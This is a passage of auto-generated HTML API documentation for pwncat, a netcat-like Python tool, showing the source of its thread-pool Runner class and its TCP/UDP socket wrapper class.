                        )
                        interrupt()
                    # [3/3] All blocking events inside the threads are gone, now join them
                    self.log.trace(&#34;Joining %s&#34;, self.__threads[key].getName())  # type: ignore
                    self.__threads[key].join(timeout=0.1)
            # If all threads have died or force is requested, then exit
            if not all([self.__threads[key].is_alive() for key in self.__threads]) or force:
                return True
            return False

        try:
            while True:
                if check_stop(False):
                    sys.exit(0)
                # Need a timeout to not skyrocket the CPU
                time.sleep(0.1)
        except KeyboardInterrupt:
            print()
            check_stop(True)
            sys.exit(1)</code></pre>
</details>
<h3>Methods</h3>
<dl>
<dt id="pwncat.Runner.add_action"><code class="name flex">
<span>def <span class="ident">add_action</span></span>(<span>self, name, action)</span>
</code></dt>
<dd>
<div class="desc"><p>Add a function to the producer/consumer thread pool runner.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>name</code></strong> :&ensp;<code>str</code></dt>
<dd>The name for the added action (will be used for logging the tread name).</dd>
<dt><strong><code>action</code></strong> :&ensp;<code><a title="pwncat.DsRunnerAction" href="#pwncat.DsRunnerAction">DsRunnerAction</a></code></dt>
<dd>Instance of DSRunnerAction.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def add_action(self, name, action):
    # type: (str, DsRunnerAction) -&gt; None
    &#34;&#34;&#34;Add a function to the producer/consumer thread pool runner.

    Args:
        name (str): The name for the added action (will be used for logging the tread name).
        action (DsRunnerAction): Instance of DSRunnerAction.
    &#34;&#34;&#34;
    self.__actions[name] = action</code></pre>
</details>
</dd>
<dt id="pwncat.Runner.add_timer"><code class="name flex">
<span>def <span class="ident">add_timer</span></span>(<span>self, name, timer)</span>
</code></dt>
<dd>
<div class="desc"><p>Add a function to the timer thread pool runner.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>name</code></strong> :&ensp;<code>str</code></dt>
<dd>The name for the added timer (will be used for logging the thread name).</dd>
<dt><strong><code>timer</code></strong> :&ensp;<code><a title="pwncat.DsRunnerTimer" href="#pwncat.DsRunnerTimer">DsRunnerTimer</a></code></dt>
<dd>Instance of DsRunnerTimer.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def add_timer(self, name, timer):
    # type: (str, DsRunnerTimer) -&gt; None
    &#34;&#34;&#34;Add a function to the timer thread pool runner.

    Args:
        name (str): The name for the added timer (will be used for logging the thread name).
        timer (DsRunnerTimer): Instance of DsRunnerTimer.
    &#34;&#34;&#34;
    self.__timers[name] = timer</code></pre>
</details>
</dd>
<dt id="pwncat.Runner.run"><code class="name flex">
<span>def <span class="ident">run</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Run threaded pwncat I/O modules.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def run(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Run threaded pwncat I/O modules.&#34;&#34;&#34;

    def run_action(
        name,  # type: str
        producer,  # type: Callable[[], str]
        consumer,  # type: Callable[[str], None]
        transformers,  # type: List[Transform]
        code,  # type: Optional[Union[str, bytes, CodeType]]
    ):
        # type: (...) -&gt; None
        &#34;&#34;&#34;Producer/consumer run function to be thrown into a thread.

        Args:
            name (str): Name for logging output.
            producer (function): A generator function which yields data.
            consumer (function): A callback which consumes data from the generator.
            transformers ([function]): List of transformer functions applied before consumer.
            code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
        &#34;&#34;&#34;
        self.log.trace(&#34;[%s] Producer Start&#34;, name)  # type: ignore
        for data in producer():
            self.log.trace(&#34;[%s] Producer received: %s&#34;, name, repr(data))  # type: ignore

            # [1/3] Transform data before sending it to the consumer
            for transformer in transformers:
                data = transformer.transform(data)
            if transformers:
                self.log.trace(  # type: ignore
                    &#34;[%s] Producer data after transformers: %s&#34;, name, repr(data)
                )

            # [2/3] Apply custom user-supplied code transformations
            if code is not None:
                self.log.debug(
                    &#34;[%s] Executing user supplied transform(data, pse) -&gt; data function&#34;, name
                )
                pse = self.__pse
                # Add current message to PSE store
                if name in self.__pse.messages:
                    self.__pse.messages[name] = self.__pse.messages[name] + [data]
                else:
                    self.__pse.messages[name] = [data]
                # Execute script code
                exec(code, {}, locals())  # pylint: disable=exec-used
                data = locals()[&#34;transform&#34;](data, pse)

                self.log.trace(  # type: ignore
                    &#34;[%s] Producer data after user supplied transformer: %s&#34;, name, repr(data)
                )

            # [3/3] Consume it
            consumer(data)
        self.log.trace(&#34;[%s] Producer Stop&#34;, name)  # type: ignore

    def run_timer(name, action, intvl, ssig, args, **kwargs):
        # type: (str, Callable[..., None], int, StopSignal, Any, Any) -&gt; None
        &#34;&#34;&#34;Timer run function to be thrown into a thread (Execs periodic tasks).

        Args:
            name (str):        Name for logging output
            action (function): Function to be called in a given intervall
            intvl (float):     Intervall at which the action function will be called
            ssig (StopSignal): Providing has_stop() and raise_stop()
            args (*args):      *args for action func
            kwargs (**kwargs): **kwargs for action func
        &#34;&#34;&#34;
        self.log.trace(&#34;[%s] Timer Start (exec every %f sec)&#34;, name, intvl)  # type: ignore
        time_last = int(time.time())
        while True:
            if ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged for timer %s&#34;, name)  # type: ignore
                return
            time_now = int(time.time())
            if time_now &gt; time_last + intvl:
                self.log.debug(&#34;[%s] Executing timed function&#34;, time_now)
                action(*args, **kwargs)
                time_last = time_now  # Reset previous time
            time.sleep(0.1)

    # Start available action in a thread
    for key in self.__actions:
        # Create Thread object
        thread = threading.Thread(
            target=run_action,
            name=key,
            args=(
                key,
                self.__actions[key].producer,
                self.__actions[key].consumer,
                self.__actions[key].transformers,
                self.__actions[key].code,
            ),
        )
        thread.daemon = False
        thread.start()
        self.__threads[key] = thread
    # Start available timers in a thread
    for key in self.__timers:
        # Create Thread object
        thread = threading.Thread(
            target=run_timer,
            name=key,
            args=(
                key,
                self.__timers[key].action,
                self.__timers[key].intvl,
                self.__timers[key].signal,
                self.__timers[key].args,
            ),
            kwargs=self.__timers[key].kwargs,
        )
        thread.daemon = False
        thread.start()

    def check_stop(force):
        # type: (int) -&gt; bool
        &#34;&#34;&#34;Stop threads.&#34;&#34;&#34;
        for key in self.__threads:
            if not self.__threads[key].is_alive() or force:
                # TODO: How are we gonna call the stop signal now?
                #  # [1/3] Inform all threads (inside) about a stop signal.
                #  # All threads with non-blocking funcs will be able to stop themselves
                #  self.log.trace(  # type: ignore
                #      &#34;Raise stop signal: StopSignal.stop() for thread [%s]&#34;,
                #      self.__threads[key].getName(),
                #  )
                #  self.__actions[key].signal.raise_stop()
                # [2/3] Call external interrupters
                # These will shutdown all blocking functions inside a thread,
                # so that they are actually able to join
                for interrupt in self.__actions[key].interrupts:
                    self.log.trace(  # type: ignore
                        &#34;Call INTERRUPT: %s.%s() for %s&#34;,
                        getattr(interrupt, &#34;__self__&#34;).__class__.__name__,
                        interrupt.__name__,
                        self.__threads[key].getName(),
                    )
                    interrupt()
                # [3/3] All blocking events inside the threads are gone, now join them
                self.log.trace(&#34;Joining %s&#34;, self.__threads[key].getName())  # type: ignore
                self.__threads[key].join(timeout=0.1)
        # If all threads have died or force is requested, then exit
        if not all([self.__threads[key].is_alive() for key in self.__threads]) or force:
            return True
        return False

    try:
        while True:
            if check_stop(False):
                sys.exit(0)
            # Need a timeout to not skyrocket the CPU
            time.sleep(0.1)
    except KeyboardInterrupt:
        print()
        check_stop(True)
        sys.exit(1)</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.Sock"><code class="flex name class">
<span>class <span class="ident">Sock</span></span>
<span>(</span><span>encoder, ssig, options)</span>
</code></dt>
<dd>
<div class="desc"><p>Provides an abstracted server client socket for TCP and UDP.</p>
<p>Instantiate Sock class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>encoder</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>Used to stop blocking loops.</dd>
<dt><strong><code>options</code></strong> :&ensp;<code><a title="pwncat.DsSock" href="#pwncat.DsSock">DsSock</a></code></dt>
<dd>Instance of DsSock.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class Sock(object):
    &#34;&#34;&#34;Provides an abstracted server client socket for TCP and UDP.&#34;&#34;&#34;

    __sock = None  # type: socket.socket
    __conn = None  # type: socket.socket

    # For Internet Protocol v4 the value consists of an integer, the least significant 8 bits of
    # which represent the value of the TOS octet in IP packets sent by the socket.
    # RFC 1349 defines the TOS values as follows:
    IP_TOS = {
        &#34;mincost&#34;: 0x02,
        &#34;lowcost&#34;: 0x02,
        &#34;reliability&#34;: 0x04,
        &#34;throughput&#34;: 0x08,
        &#34;lowdelay&#34;: 0x10,
    }

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, ssig, options):
        # type: (StringEncoder, StopSignal, DsSock) -&gt; None
        &#34;&#34;&#34;Instantiate Sock class.

        Args:
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            ssig (StopSignal): Used to stop blocking loops.
            options (DsSock): Instance of DsSock.
        &#34;&#34;&#34;
        self.__log = logging.getLogger(__name__)
        self.__enc = encoder
        self.__ssig = ssig
        self.__options = options

        # Store the address of the remote end.
        # If we are in server role and running in UDP mode,
        # it must wait for the client to connect first in order
        # to retrieve its addr and port be able to send data back to it.
        self.__remote_addr = None  # type: Optional[str]
        self.__remote_port = None  # type: Optional[int]

    # --------------------------------------------------------------------------
    # Public Send / Receive Functions
    # --------------------------------------------------------------------------
    def send(self, data):
        # type: (str) -&gt; int
        &#34;&#34;&#34;Send data through a connected socket.

        Args:
            data (str): The data to send.

        Returns:
            int: Returns total bytes sent.
        &#34;&#34;&#34;
        # In case of sending data back to an udp client we need to wait
        # until the client has first connected and told us its addr/port.
        if self.__options.udp:
            if self.__remote_addr is None or self.__remote_port is None:
                self.__log.warning(&#34;UDP client has not yet connected. Queueing message&#34;)
                while self.__remote_addr is None or self.__remote_port is None:
                    # In case the user pressed Ctrl+c on the server while trying
                    # to send data to the client, we need to quit here, otherwise
                    # it blocks the shutdown routine.
                    if self.__ssig.has_stop():
                        return 0
                    time.sleep(0.1)  # Less wastefull than using &#39;pass&#39;
                # First time a UDP client connects to the server (display it on the server)
                self.__log.info(
                    &#34;Client connected from %s:%d&#34;, self.__remote_addr, self.__remote_port
                )

        curr = 0  # bytes send during one loop iteration
        send = 0  # total bytes send
        size = len(data)  # bytes of data that needs to be send
        byte = self.__enc.encode(data)
        assert size == len(byte), &#34;Encoding messed up string length, might need to do len() after.&#34;

        # Loop until all bytes have been send
        while send &lt; size:
            try:
                self.__log.debug(
                    &#34;Trying to send %d bytes to %s:%d&#34;,
                    size - send,
                    self.__remote_addr,
                    self.__remote_port,
                )
                self.__log.trace(&#34;Trying to send: %s&#34;, repr(byte))  # type: ignore
                if self.__options.udp:
                    curr = self.__conn.sendto(byte, (self.__remote_addr, self.__remote_port))
                    send += curr
                else:
                    curr = self.__conn.send(byte)
                    send += curr
                if curr == 0:
                    self.__log.error(&#34;No bytes send during loop round.&#34;)
                    return 0
                # Remove &#39;curr&#39; many bytes from byte for the next round
                byte = byte[curr:]
                self.__log.debug(
                    &#34;Sent %d bytes to %s:%d (%d bytes remaining)&#34;,
                    curr,
                    self.__remote_addr,
                    self.__remote_port,
                    size - send,
                )
            except (OSError, socket.error) as error:
                self.__log.error(&#34;Socket OS Error: %s&#34;, error)
                return send
        return send

    def receive(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Receive and return data from the connected socket.

        Returns:
            str: Returns received data from connected socket.

        Raises:
            socket.timeout: Except here to do an action when the socket is not busy.
            AttributeError: Except here when current instance has closed itself (Ctrl+c).
            socket.error:   Except here when unconnected or connection was forcibly closed.
            EOFError:       Except here when upstream has closed the connection.
        &#34;&#34;&#34;
        try:
            # https://manpages.debian.org/buster/manpages-dev/recv.2.en.html
            (byte, addr) = self.__conn.recvfrom(self.__options.bufsize)

        # [1/5] Non-blocking socket if socket.settimeout() is set
        # NOTE: This is the place where we can do any checks in between reads as the
        # socket has been changed from blocking to time-out based.
        # NOTE: This is also the place, where we quit in case we want to.
        except socket.timeout as error:
            raise socket.timeout(error)  # type: ignore

        # [2/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)
        except AttributeError:
            msg = &#34;Connection was closed by self.&#34;
            self.__log.warning(msg)
            raise AttributeError(msg)

        # [3/5] Connection was forcibly closed
        # [Errno 107] Transport endpoint is not connected
        # [Errno 10054] An existing connection was forcibly closed by the remote host
        # [WinError 10054] An existing connection was forcibly closed by the remote host
        except (OSError, socket.error) as error:
            self.__log.warning(&#34;Connection error: %s&#34;, error)
            raise socket.error(error)

        # If we&#39;re receiving data from a UDP client
        # we can firstly/finally set its addr/port in order
        # to send data back to it (see send() function)
        if self.__options.udp:
            self.__remote_addr = addr[0]
            self.__remote_port = addr[1]
            self.__log.debug(&#34;Client connected: %s:%d&#34;, self.__remote_addr, self.__remote_port)

        # [4/5] Upstream (server or client) is gone.
        # In TCP, there is no such thing as an empty message, so zero means a peer disconnect.
        # In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.
        if not byte:
            msg = &#34;Upstream has closed the connection.&#34;
            self.__log.info(msg)
            raise EOFError(msg)

        # [5/5] We have data to process
        data = self.__enc.decode(byte)
        self.__log.debug(
            &#34;Received %d bytes from %s:%d&#34;, len(data), self.__remote_addr, self.__remote_port
        )
        self.__log.trace(&#34;Received: %s&#34;, repr(data))  # type: ignore
        return data

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def gethostbyname(self, host, port):
        # type: (Optional[str], int) -&gt; str
        &#34;&#34;&#34;Translate hostname into IP address.

        Args:
            host (str): The hostname to resolvea.
            port (int): The port of the hostname to resolve.

        Returns:
            str: Numeric IP address.

        Raises:
            socket.gaierror: If hostname cannot be resolved.
        &#34;&#34;&#34;
        family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET
        socktype = socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM
        proto = socket.SOL_UDP if self.__options.udp else socket.SOL_TCP
        flags = 0

        # Quickly do wildcards for listening addresses
        if host is None:
            if family == socket.AF_INET:
                self.__log.debug(&#34;Resolving hostname not required, using wildcard: 0.0.0.0&#34;)
                return &#34;0.0.0.0&#34;
            if family == socket.AF_INET6:
                self.__log.debug(&#34;Resolving hostname not required, using wildcard: ::&#34;)
                return &#34;::&#34;

        if self.__options.nodns:
            flags = socket.AI_NUMERICHOST
        try:
            self.__log.debug(&#34;Resolving hostname: %s&#34;, host)
            infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
            addr = str(infos[0][4][0])
        except (AttributeError, socket.gaierror) as error:
            self.__log.error(&#34;Resolve Error: %s&#34;, error)
            raise socket.gaierror(error)  # type: ignore
        self.__log.debug(&#34;Resolved hostname: %s&#34;, addr)
        return addr

    def run_client(self, addr, port):
        # type: (str, int) -&gt; bool
        &#34;&#34;&#34;Run and create a TCP or UDP client and connect to a remote peer.

        Args:
            addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
            port (int): Port of the server to connect to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # [1/4] Create socket
        try:
            conn = self.__create_socket()
        except socket.error:
            return False

        # [2/4] Store socket in instance
        self.__conn = conn

        # [3/4] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)

        # [UDP 4/4]
        if self.__options.udp:
            # UDP does not have a &#34;connect&#34; feature as it is a stateless protocol.
            # So in order for the send() function to ne the remote address,
            # we must explicitly set it here.
            # (For TCP, this is done in __connect()
            self.__remote_addr = addr
            self.__remote_port = port
            self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
            return True

        # [TCP 4/4] connect
        try:
            self.__connect(self.__conn, addr, port)
        except socket.error:
            self.__close(&#34;conn&#34;, self.__conn)
            return False

        self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
        return True

    def run_server(self, addr, port):
        # type: (str, int) -&gt; bool
        # TODO: Integrate: --rebind(-wait|-robin)
        &#34;&#34;&#34;Run and create a TCP or UDP listening server and wait for a client to connect.

        Args:
            addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
            port (int): Port of the address to bind to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # [1/4] Create socket
        try:
            sock = self.__create_socket()
        except socket.error:
            return False

        # [2/4] Bind socket
        if not self.__bind(sock, addr, port):
            self.__close(&#34;sock&#34;, sock)
            return False

        family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET

        # [UDP 3/4] There is no listen or accept for UDP
        if self.__options.udp:
            self.__conn = sock
            self.__log.info(&#34;Listening on %s (family %d/UDP, port %d)&#34;, addr, family, port)

        # [TCP 3/4] Requires listen and accept
        else:
            # Listen
            if not self.__listen(sock):
                self.__close(&#34;sock&#34;, sock)
                return False
            self.__log.info(&#34;Listening on %s (family %d/TCP, port %d)&#34;, addr, family, port)
            self.__print_socket_opts(sock, &#34;bind-sock&#34;)
            # Accept
            try:
                conn = self.__accept(sock)
            except socket.error:
                self.__close(&#34;sock&#34;, sock)
                return False
            self.__sock = sock
            self.__conn = conn

        # [4/4] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)
        self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
        return True

    def re_accept_client(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Re-accept new clients, if connection is somehow closed or accept did not work.

        Returns:
            bool: Returns `True` on success and `False` and error.
        &#34;&#34;&#34;
        # [1/3] Close conn socket
        self.close_conn_sock()

        # [2/3] Accept
        try:
            conn = self.__accept(self.__sock)
        except socket.error:
            return False
        self.__conn = conn
        # [3/3] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)
        return True

    def close_bind_sock(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Close the bind socket used by the server to accept clients.&#34;&#34;&#34;
        try:
            self.__close(&#34;sock&#34;, self.__sock)
        except AttributeError:
            # Socket does not exist (anymore)
            pass

    def close_conn_sock(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Close the communication socket used for send and receive.&#34;&#34;&#34;
        try:
            self.__close(&#34;conn&#34;, self.__conn)
        except AttributeError:
            # Socket does not exist (anymore)
            pass

    # --------------------------------------------------------------------------
    # Private Functions (general)
    # --------------------------------------------------------------------------
    def __print_socket_opts(self, sock, log_prefix=&#34;Socket&#34;):
        # type: (socket.socket, str) -&gt; None
        &#34;&#34;&#34;Debug logs configured socket options.&#34;&#34;&#34;
        # https://hg.python.org/cpython/file/3.5/Modules/socketmodule.c
        options = {
            &#34;Sock&#34;: [
                &#34;SO_DEBUG&#34;,
                &#34;SO_ACCEPTCONN&#34;,
                &#34;SO_REUSEADDR&#34;,
                &#34;SO_EXCLUSIVEADDRUSE&#34;,
                &#34;SO_KEEPALIVE&#34;,
                &#34;SO_DONTROUTE&#34;,
                &#34;SO_BROADCAST&#34;,
                &#34;SO_USELOOPBACK&#34;,
                &#34;SO_LINGER&#34;,
                &#34;SO_OOBINLINE&#34;,
                &#34;SO_REUSEPORT&#34;,
                &#34;SO_SNDBUF&#34;,
                &#34;SO_RCVBUF&#34;,
                &#34;SO_SNDLOWAT&#34;,
                &#34;SO_RCVLOWAT&#34;,
                &#34;SO_SNDTIMEO&#34;,
                &#34;SO_RCVTIMEO&#34;,
                &#34;SO_ERROR&#34;,
                &#34;SO_TYPE&#34;,
                &#34;SO_SETFIB&#34;,
                &#34;SO_PASSCRED&#34;,
                &#34;SO_PEERCRED&#34;,
                &#34;LOCAL_PEERCRED&#34;,
                &#34;SO_BINDTODEVICE&#34;,
                &#34;SO_PRIORITY&#34;,
                &#34;SO_MARK&#34;,
            ],
            &#34;IPv4&#34;: [
                &#34;IP_OPTIONS&#34;,
                &#34;IP_HDRINCL&#34;,
                &#34;IP_TOS&#34;,
                &#34;IP_TTL&#34;,
                &#34;IP_RECVOPTS&#34;,
                &#34;IP_RECVRETOPTS&#34;,
                &#34;IP_RECVDSTADDR&#34;,
                &#34;IP_RETOPTS&#34;,
                &#34;IP_MULTICAST_IF&#34;,
                &#34;IP_MULTICAST_TTL&#34;,
                &#34;IP_MULTICAST_LOOP&#34;,
                &#34;IP_ADD_MEMBERSHIP&#34;,
                &#34;IP_DROP_MEMBERSHIP&#34;,
                &#34;IP_DEFAULT_MULTICAST_TTL&#34;,
                &#34;IP_DEFAULT_MULTICAST_LOOP&#34;,
                &#34;IP_MAX_MEMBERSHIPS&#34;,
                &#34;IP_TRANSPARENT&#34;,
            ],
            &#34;IPv6&#34;: [
                &#34;IPV6_JOIN_GROUP&#34;,
                &#34;IPV6_LEAVE_GROUP&#34;,
                &#34;IPV6_MULTICAST_HOPS&#34;,
                &#34;IPV6_MULTICAST_IF&#34;,
                &#34;IPV6_MULTICAST_LOOP&#34;,
                &#34;IPV6_UNICAST_HOPS&#34;,
                &#34;IPV6_V6ONLY&#34;,
                &#34;IPV6_CHECKSUM&#34;,
                &#34;IPV6_DONTFRAG&#34;,
                &#34;IPV6_DSTOPTS&#34;,
                &#34;IPV6_HOPLIMIT&#34;,
                &#34;IPV6_HOPOPTS&#34;,
                &#34;IPV6_NEXTHOP&#34;,
                &#34;IPV6_PATHMTU&#34;,
                &#34;IPV6_PKTINFO&#34;,
                &#34;IPV6_RECVDSTOPTS&#34;,
                &#34;IPV6_RECVHOPLIMIT&#34;,
                &#34;IPV6_RECVHOPOPTS&#34;,
                &#34;IPV6_RECVPKTINFO&#34;,
                &#34;IPV6_RECVRTHDR&#34;,
                &#34;IPV6_RECVTCLASS&#34;,
                &#34;IPV6_RTHDR&#34;,
                &#34;IPV6_RTHDRDSTOPTS&#34;,
                &#34;IPV6_RTHDR_TYPE_0&#34;,
                &#34;IPV6_RECVPATHMTU&#34;,
                &#34;IPV6_TCLASS&#34;,
                &#34;IPV6_USE_MIN_MTU&#34;,
            ],
            &#34;TCP&#34;: [
                &#34;TCP_NODELAY&#34;,
                &#34;TCP_MAXSEG&#34;,
                &#34;TCP_CORK&#34;,
                &#34;TCP_KEEPIDLE&#34;,
                &#34;TCP_KEEPINTVL&#34;,
                &#34;TCP_KEEPCNT&#34;,
                &#34;TCP_SYNCNT&#34;,
                &#34;TCP_LINGER2&#34;,
                &#34;TCP_DEFER_ACCEPT&#34;,
                &#34;TCP_WINDOW_CLAMP&#34;,
                &#34;TCP_INFO&#34;,
                &#34;TCP_QUICKACK&#34;,
                &#34;TCP_FASTOPEN&#34;,
            ],
        }
        for proto, optnames in options.items():
            if self.__options.info == &#34;all&#34; or proto.lower() == self.__options.info:
                for optname in optnames:
                    if proto.lower() == &#34;sock&#34;:
                        level = socket.SOL_SOCKET
                    elif proto.lower() == &#34;ipv4&#34;:
                        level = socket.IPPROTO_IP
                    elif proto.lower() == &#34;ipv6&#34;:
                        level = socket.IPPROTO_IPV6
                    elif proto.lower() == &#34;tcp&#34;:
                        level = socket.IPPROTO_TCP
                    try:
                        self.__log.info(
                            &#34;[%s] %s: %s: %s&#34;,
                            log_prefix,
                            proto,
                            optname,
                            sock.getsockopt(
                                level, eval(&#34;socket.&#34; + optname)  # pylint: disable=eval-used
                            ),
                        )
                    except AttributeError:
                        pass
                    except (OSError, socket.error):
                        pass

    def __create_socket(self):
        # type: () -&gt; socket.socket
        &#34;&#34;&#34;Create TCP or UDP socket.

        Returns:
            socket.socket: Returns TCP or UDP socket.

        Raises:
            socket.error: If socket cannot be created.
        &#34;&#34;&#34;
        family_sock = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET
        family_name = &#34;IPv6&#34; if self.__options.ipv6 else &#34;IPv4&#34;
        try:
            if self.__options.udp:
                self.__log.debug(&#34;Creating %s UDP socket&#34;, family_name)
                sock = socket.socket(family_sock, socket.SOCK_DGRAM)
            else:
                self.__log.debug(&#34;Creating %s TCP socket&#34;, family_name)
                sock = socket.socket(family_sock, socket.SOCK_STREAM)
        except socket.error as error:
            msg = &#34;Failed to create {} socket: {}&#34;.format(family_name, error)
            self.__log.error(msg)
            raise socket.error(msg)
        # Get around the &#34;[Errno 98] Address already in use&#34; error, if the socket is still in wait
        # we instruct it to reuse the address anyway.
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        if self.__options.ip_tos is not None:
            self.__log.info(&#34;Setting IP_TOS to: %d&#34;, self.IP_TOS[self.__options.ip_tos])
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, self.IP_TOS[self.__options.ip_tos])

        return sock

    def __settimeout(self, sock):
        # type: (socket.socket) -&gt; None
        &#34;&#34;&#34;Set the receive timeout on a socket.

        Args:
            sock (socket.socket): The socket to set the receive timeout for.
        &#34;&#34;&#34;
        self.__log.debug(&#34;Setting sock recv timeout to %f sec&#34;, self.__options.recv_timeout)
        sock.settimeout(self.__options.recv_timeout)

    def __close(self, name, sock):
        # type: (str, socket.socket) -&gt; None
        &#34;&#34;&#34;Shuts down and closes a socket.

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown and close.
        &#34;&#34;&#34;
        assert name in [&#34;sock&#34;, &#34;conn&#34;]
        try:
            # (SHUT_RD)   0 = Done receiving (disallows receiving)
            # (SHUT_WR)   1 = Done sending (disallows sending)
            # (SHUT_RDWR) 2 = Both
            self.__log.trace(&#34;Shutting down %s socket&#34;, name)  # type: ignore
            sock.shutdown(socket.SHUT_RDWR)
        except (OSError, socket.error) as error:
            self.__log.trace(&#34;Could not shutdown %s socket: %s&#34;, name, error)  # type: ignore

        try:
            self.__log.trace(&#34;Closing %s socket&#34;, name)  # type: ignore
            sock.close()
        except (OSError, socket.error) as error:
            self.__log.trace(&#34;Could not close %s socket: %s&#34;, name, error)  # type: ignore

    # --------------------------------------------------------------------------
    # Private Functions (server)
    # --------------------------------------------------------------------------
    def __bind(self, sock, addr, port):
        # type: (socket.socket, str, int) -&gt; bool
        &#34;&#34;&#34;Bind the socket to an address.

        Args:
            sock (socket.socket): The socket to bind.
            addr (str): The numerical IP address to bind to.
            port (int): The port to bind to.

        Returns:
            bool: Returns `True` on success and `False` on Failure.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Binding socket to %s:%d&#34;, addr, port)
            sock.bind((addr, port))
            return True
        except (OverflowError, OSError, socket.error) as error:
            self.__log.error(&#34;Binding socket to %s:%d failed: %s&#34;, addr, port, error)
            return False

    def __listen(self, sock):
        # type: (socket.socket) -&gt; bool
        &#34;&#34;&#34;Listen for connections made to the socket.

        Args:
            sock (socket.socket): The socket to listen on.

        Returns:
            bool: Returns `True` on success and `False` on Failure.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Listening with backlog=%d&#34;, self.__options.backlog)
            sock.listen(self.__options.backlog)
            return True
        except socket.error as error:
            self.__log.error(&#34;Listening failed: %s&#34;, error)
            return False

    def __accept(self, sock):
        # type: (socket.socket) -&gt; socket.socket
        &#34;&#34;&#34;Accept a connection. The socket must be bound to an addr and listening for connections.

        Args:
            sock (socket.socket): The socket to accept on.

        Returns:
            socket.socket: Returns the connection socket.

        Raises:
            socket.error: If the server cannot accept connections on its socket.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Waiting for TCP client&#34;)
            conn, client = sock.accept()
        except (socket.gaierror, socket.error) as error:
            msg = &#34;Accept failed: {}&#34;.format(error)
            self.__log.error(msg)
            raise socket.error(msg)
        # Store connected remote peer address and port
        self.__remote_addr = client[0]
        self.__remote_port = client[1]
        self.__log.info(&#34;Client connected from %s:%d&#34;, self.__remote_addr, self.__remote_port)
        return conn

    # --------------------------------------------------------------------------
    # Private Functions (client)
    # --------------------------------------------------------------------------
    def __connect(self, sock, addr, port):
        # type: (socket.socket, str, int) -&gt; None
        &#34;&#34;&#34;Connect to a remote socket at given address and port (TCP-only).

        Args:
            sock (socket.socket): The socket to use for connecting.
            addr (str): Numerical IP address of server to connect to.
            port (int): Port of server to connect to.

        Raises:
            socker.error: If client cannot connect to remote peer.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Connecting to %s:%d&#34;, addr, port)
            sock.connect((addr, port))
        except socket.error as error:
            msg = &#34;Connecting to {}:{} failed: {}&#34;.format(addr, port, error)
            self.__log.error(msg)
            raise socket.error(msg)
        self.__log.info(&#34;Connected to %s:%d&#34;, addr, port)
        # Store connected remote peer address and port
        self.__remote_addr = addr
        self.__remote_port = port</code></pre>
</details>
<h3>Class variables</h3>
<dl>
<dt id="pwncat.Sock.IP_TOS"><code class="name">var <span class="ident">IP_TOS</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.Sock.close_bind_sock"><code class="name flex">
<span>def <span class="ident">close_bind_sock</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Close the bind socket used by the server to accept clients.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def close_bind_sock(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Close the bind socket used by the server to accept clients.&#34;&#34;&#34;
    try:
        self.__close(&#34;sock&#34;, self.__sock)
    except AttributeError:
        # Socket does not exist (anymore)
        pass</code></pre>
</details>
</dd>
<dt id="pwncat.Sock.close_conn_sock"><code class="name flex">
<span>def <span class="ident">close_conn_sock</span></span>(<span>self)</span>
</code></dt>
<dd>
